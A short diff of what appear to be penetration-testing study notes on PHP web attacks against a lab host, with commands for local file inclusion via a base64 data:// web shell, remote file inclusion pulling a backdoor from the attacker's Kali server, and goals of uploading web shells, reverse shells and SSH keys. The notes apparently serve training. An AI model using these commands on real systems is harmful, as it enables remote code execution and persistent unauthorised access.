@@ -232,14 +232,14 @@
     - execute system command  
       `kali@kali:~$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZW
 NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
-- Remote file inclusion (RFI)  
+- **Remote file inclusion (RFI)**   
   - ⚠️ **Goal: load malicious PHP payload from kali**    
   - Inspect: url?**page=**xxx  
   - start kali webshells  
     `kali@kali:/usr/share/webshells/php/$ python3 -m http.server 80`  
   - exploit RFI  
     `curl "http://mountaindesserts.com/meteor/index.php?page=http://<kali>/simple-backdoor.php&cmd=ls"`
-- File upload vulnerabilities  
+- **File upload vulnerabilities**    
   - Goal  
     - ⚠️ **upload and execute web shell/RCE-->revere shell**    
     - Upload SSH key into ~/.ssh/authorized_keys   
